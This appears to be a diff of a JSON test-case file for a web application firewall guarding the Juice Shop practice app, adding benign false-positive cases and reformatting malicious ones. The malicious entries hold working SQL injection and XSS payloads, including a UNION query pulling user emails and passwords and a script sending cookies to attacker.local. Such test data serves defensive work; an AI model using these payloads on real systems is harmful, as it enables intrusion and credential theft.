@@ -17,7 +17,9 @@
     "expected_class": "benign",
     "method": "GET",
     "path": "/rest/products/search",
-    "params": {"q": "apple"},
+    "params": {
+      "q": "apple"
+    },
     "headers": {},
     "body": null,
     "description": "Benign search query for fruit product 'apple'",
@@ -29,7 +31,9 @@
     "expected_class": "benign",
     "method": "GET",
     "path": "/rest/products/search",
-    "params": {"q": "orange juice"},
+    "params": {
+      "q": "orange juice"
+    },
     "headers": {},
     "body": null,
     "description": "Benign search query containing spaced words 'orange juice'",
@@ -41,7 +45,9 @@
     "expected_class": "benign",
     "method": "GET",
     "path": "/rest/products/search",
-    "params": {"q": "banana & strawberry"},
+    "params": {
+      "q": "banana & strawberry"
+    },
     "headers": {},
     "body": null,
     "description": "Benign search query with ampersand character",
@@ -102,7 +108,9 @@
     "method": "POST",
     "path": "/rest/user/login",
     "params": {},
-    "headers": {"Content-Type": "application/json"},
+    "headers": {
+      "Content-Type": "application/json"
+    },
     "body": "{\"email\":\"testuser@example.com\",\"password\":\"SecureP@ssw0rd!\"}",
     "description": "Benign login attempt with standard email and strong password",
     "expected_waf_behavior": "allow"
@@ -114,7 +122,9 @@
     "method": "POST",
     "path": "/api/Feedbacks/",
     "params": {},
-    "headers": {"Content-Type": "application/json"},
+    "headers": {
+      "Content-Type": "application/json"
+    },
     "body": "{\"comment\":\"Great shopping experience, thanks!\",\"rating\":5}",
     "description": "Benign feedback form submission with text and integer",
     "expected_waf_behavior": "allow"
@@ -137,10 +147,418 @@
     "expected_class": "benign",
     "method": "GET",
     "path": "/rest/products/search",
-    "params": {"q": "100% natural organic"},
+    "params": {
+      "q": "100% natural organic"
+    },
     "headers": {},
     "body": null,
     "description": "Search query containing percentage character used in benign context",
+    "expected_waf_behavior": "allow"
+  },
+  {
+    "test_id": "BENIGN-013",
+    "category": "normal",
+    "expected_class": "benign",
+    "method": "GET",
+    "path": "/rest/products/search",
+    "params": {
+      "q": "O'Reilly"
+    },
+    "headers": {},
+    "body": null,
+    "description": "Search containing an apostrophe (common false-positive trigger)",
+    "expected_waf_behavior": "allow"
+  },
+  {
+    "test_id": "BENIGN-014",
+    "category": "normal",
+    "expected_class": "benign",
+    "method": "GET",
+    "path": "/rest/products/search",
+    "params": {
+      "q": "juice 100% natural"
+    },
+    "headers": {},
+    "body": null,
+    "description": "Search containing a percent sign",
+    "expected_waf_behavior": "allow"
+  },
+  {
+    "test_id": "BENIGN-015",
+    "category": "normal",
+    "expected_class": "benign",
+    "method": "GET",
+    "path": "/rest/products/search",
+    "params": {
+      "q": "café crème"
+    },
+    "headers": {},
+    "body": null,
+    "description": "Search with non-ASCII Unicode characters",
+    "expected_waf_behavior": "allow"
+  },
+  {
+    "test_id": "BENIGN-016",
+    "category": "normal",
+    "expected_class": "benign",
+    "method": "GET",
+    "path": "/rest/products/search",
+    "params": {
+      "q": "select fruit"
+    },
+    "headers": {},
+    "body": null,
+    "description": "Natural English word 'select' in a search",
+    "expected_waf_behavior": "allow"
+  },
+  {
+    "test_id": "BENIGN-017",
+    "category": "normal",
+    "expected_class": "benign",
+    "method": "GET",
+    "path": "/rest/products/search",
+    "params": {
+      "q": "apple-banana mix"
+    },
+    "headers": {},
+    "body": null,
+    "description": "Hyphenated search term",
+    "expected_waf_behavior": "allow"
+  },
+  {
+    "test_id": "BENIGN-018",
+    "category": "normal",
+    "expected_class": "benign",
+    "method": "GET",
+    "path": "/rest/products/search",
+    "params": {
+      "q": "C# sticker"
+    },
+    "headers": {},
+    "body": null,
+    "description": "Search containing a hash sign",
+    "expected_waf_behavior": "allow"
+  },
+  {
+    "test_id": "BENIGN-019",
+    "category": "normal",
+    "expected_class": "benign",
+    "method": "GET",
+    "path": "/rest/products/search",
+    "params": {
+      "q": "1 or 2 bottles"
+    },
+    "headers": {},
+    "body": null,
+    "description": "Natural phrase containing the word 'or'",
+    "expected_waf_behavior": "allow"
+  },
+  {
+    "test_id": "BENIGN-020",
+    "category": "normal",
+    "expected_class": "benign",
+    "method": "GET",
+    "path": "/rest/products/search",
+    "params": {
+      "q": "lemon (organic)"
+    },
+    "headers": {},
+    "body": null,
+    "description": "Search with parentheses",
+    "expected_waf_behavior": "allow"
+  },
+  {
+    "test_id": "BENIGN-021",
+    "category": "normal",
+    "expected_class": "benign",
+    "method": "GET",
+    "path": "/rest/products/search",
+    "params": {
+      "q": "\"green smoothie\""
+    },
+    "headers": {},
+    "body": null,
+    "description": "Search with double quotes",
+    "expected_waf_behavior": "allow"
+  },
+  {
+    "test_id": "BENIGN-022",
+    "category": "normal",
+    "expected_class": "benign",
+    "method": "GET",
+    "path": "/rest/products/search",
+    "params": {
+      "q": "price: 2.99/l"
+    },
+    "headers": {},
+    "body": null,
+    "description": "Search with colon and slash",
+    "expected_waf_behavior": "allow"
+  },
+  {
+    "test_id": "BENIGN-023",
+    "category": "normal",
+    "expected_class": "benign",
+    "method": "GET",
+    "path": "/rest/products/search",
+    "params": {
+      "q": "melon; kiwi"
+    },
+    "headers": {},
+    "body": null,
+    "description": "Search with semicolon separator",
+    "expected_waf_behavior": "allow"
+  },
+  {
+    "test_id": "BENIGN-024",
+    "category": "normal",
+    "expected_class": "benign",
+    "method": "GET",
+    "path": "/rest/products/search",
+    "params": {
+      "q": "bestseller 2026"
+    },
+    "headers": {},
+    "body": null,
+    "description": "Alphanumeric search",
+    "expected_waf_behavior": "allow"
+  },
+  {
+    "test_id": "BENIGN-025",
+    "category": "normal",
+    "expected_class": "benign",
+    "method": "GET",
+    "path": "/rest/products/search",
+    "params": {
+      "q": "t-shirt size=XL"
+    },
+    "headers": {},
+    "body": null,
+    "description": "Search containing an equals sign",
+    "expected_waf_behavior": "allow"
+  },
+  {
+    "test_id": "BENIGN-026",
+    "category": "normal",
+    "expected_class": "benign",
+    "method": "GET",
+    "path": "/api/Products/1",
+    "params": {},
+    "headers": {},
+    "body": null,
+    "description": "Product detail by id",
+    "expected_waf_behavior": "allow"
+  },
+  {
+    "test_id": "BENIGN-027",
+    "category": "normal",
+    "expected_class": "benign",
+    "method": "GET",
+    "path": "/rest/products/1/reviews",
+    "params": {},
+    "headers": {},
+    "body": null,
+    "description": "Product reviews listing",
+    "expected_waf_behavior": "allow"
+  },
+  {
+    "test_id": "BENIGN-028",
+    "category": "normal",
+    "expected_class": "benign",
+    "method": "GET",
+    "path": "/api/Quantitys/",
+    "params": {},
+    "headers": {},
+    "body": null,
+    "description": "Stock quantity listing",
+    "expected_waf_behavior": "allow"
+  },
+  {
+    "test_id": "BENIGN-029",
+    "category": "normal",
+    "expected_class": "benign",
+    "method": "GET",
+    "path": "/rest/languages",
+    "params": {},
+    "headers": {},
+    "body": null,
+    "description": "Available UI languages",
+    "expected_waf_behavior": "allow"
+  },
+  {
+    "test_id": "BENIGN-030",
+    "category": "normal",
+    "expected_class": "benign",
+    "method": "GET",
+    "path": "/rest/admin/application-version",
+    "params": {},
+    "headers": {},
+    "body": null,
+    "description": "Application version endpoint",
+    "expected_waf_behavior": "allow"
+  },
+  {
+    "test_id": "BENIGN-031",
+    "category": "normal",
+    "expected_class": "benign",
+    "method": "GET",
+    "path": "/rest/admin/application-configuration",
+    "params": {},
+    "headers": {},
+    "body": null,
+    "description": "Public application configuration",
+    "expected_waf_behavior": "allow"
+  },
+  {
+    "test_id": "BENIGN-032",
+    "category": "normal",
+    "expected_class": "benign",
+    "method": "GET",
+    "path": "/api/SecurityQuestions/",
+    "params": {},
+    "headers": {},
+    "body": null,
+    "description": "Security question list used by registration",
+    "expected_waf_behavior": "allow"
+  },
+  {
+    "test_id": "BENIGN-033",
+    "category": "normal",
+    "expected_class": "benign",
+    "method": "GET",
+    "path": "/rest/memories",
+    "params": {},
+    "headers": {},
+    "body": null,
+    "description": "Photo wall listing",
+    "expected_waf_behavior": "allow"
+  },
+  {
+    "test_id": "BENIGN-034",
+    "category": "normal",
+    "expected_class": "benign",
+    "method": "GET",
+    "path": "/assets/public/images/products/apple_juice.jpg",
+    "params": {},
+    "headers": {},
+    "body": null,
+    "description": "Static product image",
+    "expected_waf_behavior": "allow"
+  },
+  {
+    "test_id": "BENIGN-035",
+    "category": "normal",
+    "expected_class": "benign",
+    "method": "GET",
+    "path": "/assets/i18n/en.json",
+    "params": {},
+    "headers": {},
+    "body": null,
+    "description": "Translation bundle",
+    "expected_waf_behavior": "allow"
+  },
+  {
+    "test_id": "BENIGN-036",
+    "category": "normal",
+    "expected_class": "benign",
+    "method": "GET",
+    "path": "/robots.txt",
+    "params": {},
+    "headers": {},
+    "body": null,
+    "description": "robots.txt",
+    "expected_waf_behavior": "allow"
+  },
+  {
+    "test_id": "BENIGN-037",
+    "category": "normal",
+    "expected_class": "benign",
+    "method": "POST",
+    "path": "/rest/user/login",
+    "params": {},
+    "headers": {},
+    "body": {
+      "email": "customer@example.com",
+      "password": "Sunny-Day-2026"
+    },
+    "description": "Normal JSON login (invalid credentials expected)",
+    "expected_waf_behavior": "allow"
+  },
+  {
+    "test_id": "BENIGN-038",
+    "category": "normal",
+    "expected_class": "benign",
+    "method": "POST",
+    "path": "/api/Feedbacks/",
+    "params": {},
+    "headers": {},
+    "body": {
+      "comment": "Great taste, I'd buy again! 5/5",
+      "rating": 5
+    },
+    "description": "Feedback with apostrophe and slash",
+    "expected_waf_behavior": "allow"
+  },
+  {
+    "test_id": "BENIGN-039",
+    "category": "normal",
+    "expected_class": "benign",
+    "method": "POST",
+    "path": "/api/Feedbacks/",
+    "params": {},
+    "headers": {},
+    "body": {
+      "comment": "Delivery took 2-3 days; packaging was fine.",
+      "rating": 4
+    },
+    "description": "Feedback with semicolon",
+    "expected_waf_behavior": "allow"
+  },
+  {
+    "test_id": "BENIGN-040",
+    "category": "normal",
+    "expected_class": "benign",
+    "method": "POST",
+    "path": "/api/Feedbacks/",
+    "params": {},
+    "headers": {},
+    "body": {
+      "comment": "Not bad (a bit sweet) - would prefer less sugar.",
+      "rating": 3
+    },
+    "description": "Feedback with parentheses",
+    "expected_waf_behavior": "allow"
+  },
+  {
+    "test_id": "BENIGN-041",
+    "category": "normal",
+    "expected_class": "benign",
+    "method": "POST",
+    "path": "/api/Users/",
+    "params": {},
+    "headers": {},
+    "body": {
+      "email": "new.user+shop@example.com",
+      "password": "Blue-Kettle-77",
+      "passwordRepeat": "Blue-Kettle-77"
+    },
+    "description": "Registration with plus-addressed email",
+    "expected_waf_behavior": "allow"
+  },
+  {
+    "test_id": "BENIGN-042",
+    "category": "normal",
+    "expected_class": "benign",
+    "method": "GET",
+    "path": "/rest/products/search",
+    "params": {
+      "q": "apple"
+    },
+    "headers": {
+      "Accept-Language": "de-DE,de;q=0.9,en;q=0.8"
+    },
+    "body": null,
+    "description": "Search with realistic Accept-Language header",
     "expected_waf_behavior": "allow"
   },
   {
@@ -149,7 +567,9 @@
     "expected_class": "malicious",
     "method": "GET",
     "path": "/rest/products/search",
-    "params": {"q": "' OR '1'='1"},
+    "params": {
+      "q": "' OR '1'='1"
+    },
     "headers": {},
     "body": null,
     "description": "Classic tautology boolean-based SQL injection",
@@ -161,7 +581,9 @@
     "expected_class": "malicious",
     "method": "GET",
     "path": "/rest/products/search",
-    "params": {"q": "1 UNION SELECT NULL,NULL,NULL--"},
+    "params": {
+      "q": "1 UNION SELECT NULL,NULL,NULL--"
+    },
     "headers": {},
     "body": null,
     "description": "UNION-based SQL injection with multi-column null probe and comment",
@@ -173,7 +595,9 @@
     "expected_class": "malicious",
     "method": "GET",
     "path": "/rest/products/search",
-    "params": {"q": "')) UNION SELECT null,id,email,password,null,null,null,null,null FROM Users--"},
+    "params": {
+      "q": "')) UNION SELECT null,id,email,password,null,null,null,null,null FROM Users--"
+    },
     "headers": {},
     "body": null,
     "description": "Juice Shop specific SQLite schema extraction via UNION injection",
@@ -186,7 +610,9 @@
     "method": "POST",
     "path": "/rest/user/login",
     "params": {},
-    "headers": {"Content-Type": "application/json"},
+    "headers": {
+      "Content-Type": "application/json"
+    },
     "body": "{\"email\":\"' OR 1=1--\",\"password\":\"irrelevant\"}",
     "description": "Authentication bypass via SQL injection in JSON email field",
     "expected_waf_behavior": "block"
@@ -198,7 +624,9 @@
     "method": "POST",
     "path": "/rest/user/login",
     "params": {},
-    "headers": {"Content-Type": "application/json"},
+    "headers": {
+      "Content-Type": "application/json"
+    },
     "body": "{\"email\":\"admin@juice-sh.op'--\",\"password\":\"any\"}",
     "description": "SQL injection admin comment bypass in login payload",
     "expected_waf_behavior": "block"
@@ -209,7 +637,9 @@
     "expected_class": "malicious",
     "method": "GET",
     "path": "/rest/products/search",
-    "params": {"q": "apple'; WAITFOR DELAY '0:0:5'--"},
+    "params": {
+      "q": "apple'; WAITFOR DELAY '0:0:5'--"
+    },
     "headers": {},
     "body": null,
     "description": "Time-based blind SQL injection attempt using WAITFOR syntax",
@@ -221,7 +651,9 @@
     "expected_class": "malicious",
     "method": "GET",
     "path": "/rest/products/search",
-    "params": {"q": "1 AND 1=CONVERT(int, @@version)"},
+    "params": {
+      "q": "1 AND 1=CONVERT(int, @@version)"
+    },
     "headers": {},
     "body": null,
     "description": "Error-based SQL injection with database function query",
@@ -233,7 +665,9 @@
     "expected_class": "malicious",
     "method": "GET",
     "path": "/rest/products/search",
-    "params": {"q": "1' OR (SELECT COUNT(*) FROM sqlite_master)>0--"},
+    "params": {
+      "q": "1' OR (SELECT COUNT(*) FROM sqlite_master)>0--"
+    },
     "headers": {},
     "body": null,
     "description": "Subquery injection targeting SQLite catalog tables",
@@ -245,7 +679,9 @@
     "expected_class": "malicious",
     "method": "GET",
     "path": "/rest/products/search",
-    "params": {"q": "test' OR pg_sleep(5)--"},
+    "params": {
+      "q": "test' OR pg_sleep(5)--"
+    },
     "headers": {},
     "body": null,
     "description": "Postgres-style time-based injection payload",
@@ -257,7 +693,9 @@
     "expected_class": "malicious",
     "method": "GET",
     "path": "/rest/products/search",
-    "params": {"q": "1' ORDER BY 10--"},
+    "params": {
+      "q": "1' ORDER BY 10--"
+    },
     "headers": {},
     "body": null,
     "description": "Order by column enumeration probe",
@@ -269,7 +707,9 @@
     "expected_class": "malicious",
     "method": "GET",
     "path": "/",
-    "params": {"q": "<script>alert('XSS-1')</script>"},
+    "params": {
+      "q": "<script>alert('XSS-1')</script>"
+    },
     "headers": {},
     "body": null,
     "description": "Reflected XSS with direct script tag execution",
@@ -281,7 +721,9 @@
     "expected_class": "malicious",
     "method": "GET",
     "path": "/rest/products/search",
-    "params": {"q": "<img src=x onerror=alert(document.domain)>"},
+    "params": {
+      "q": "<img src=x onerror=alert(document.domain)>"
+    },
     "headers": {},
     "body": null,
     "description": "Event handler injection via broken image tag onerror",
@@ -293,7 +735,9 @@
     "expected_class": "malicious",
     "method": "GET",
     "path": "/rest/products/search",
-    "params": {"q": "<svg onload=alert(1)>"},
+    "params": {
+      "q": "<svg onload=alert(1)>"
+    },
     "headers": {},
     "body": null,
     "description": "SVG vector with onload event handler",
@@ -305,7 +749,9 @@
     "expected_class": "malicious",
     "method": "GET",
     "path": "/rest/products/search",
-    "params": {"q": "<iframe src=\"javascript:alert('XSS')\">"},
+    "params": {
+      "q": "<iframe src=\"javascript:alert('XSS')\">"
+    },
     "headers": {},
     "body": null,
     "description": "Iframe injection executing javascript pseudo-protocol",
@@ -318,7 +764,9 @@
     "method": "POST",
     "path": "/api/Feedbacks/",
     "params": {},
-    "headers": {"Content-Type": "application/json"},
+    "headers": {
+      "Content-Type": "application/json"
+    },
     "body": "{\"comment\":\"<script>fetch('http://attacker.local/?c='+document.cookie)</script>\",\"rating\":1}",
     "description": "Stored XSS payload targeting cookie exfiltration in comment body",
     "expected_waf_behavior": "block"
@@ -329,7 +777,9 @@
     "expected_class": "malicious",
     "method": "GET",
     "path": "/rest/products/search",
-    "params": {"q": "\"><script src=//evil.site/payload.js></script>"},
+    "params": {
+      "q": "\"><script src=//evil.site/payload.js></script>"
+    },
     "headers": {},
     "body": null,
     "description": "Attribute breakout leading to remote script inclusion",
@@ -341,7 +791,9 @@
     "expected_class": "malicious",
     "method": "GET",
     "path": "/rest/products/search",
-    "params": {"q": "<body onpageshow=alert(1)>"},
+    "params": {
+      "q": "<body onpageshow=alert(1)>"
+    },
     "headers": {},
     "body": null,
     "description": "Body tag event handler injection",
@@ -353,7 +805,9 @@
     "expected_class": "malicious",
     "method": "GET",
     "path": "/rest/products/search",
-    "params": {"q": "<input autofocus onfocus=alert(1)>"},
+    "params": {
+      "q": "<input autofocus onfocus=alert(1)>"
+    },
     "headers": {},
     "body": null,
     "description": "Autofocus input element triggering onfocus automatically",
@@ -365,7 +819,9 @@
     "expected_class": "malicious",
     "method": "GET",
     "path": "/rest/products/search",
-    "params": {"q": "<a href=\"javascript:alert(1)\">ClickMe</a>"},
+    "params": {
+      "q": "<a href=\"javascript:alert(1)\">ClickMe</a>"
+    },
     "headers": {},
     "body": null,
     "description": "Anchor tag with javascript pseudo-protocol link",
@@ -377,7 +833,9 @@
     "expected_class": "malicious",
     "method": "GET",
     "path": "/rest/products/search",
-    "params": {"q": "{{constructor.constructor('alert(1)')()}}"},
+    "params": {
+      "q": "{{constructor.constructor('alert(1)')()}}"
+    },
     "headers": {},
     "body": null,
     "description": "AngularJS client-side template injection (CSTI) vector",
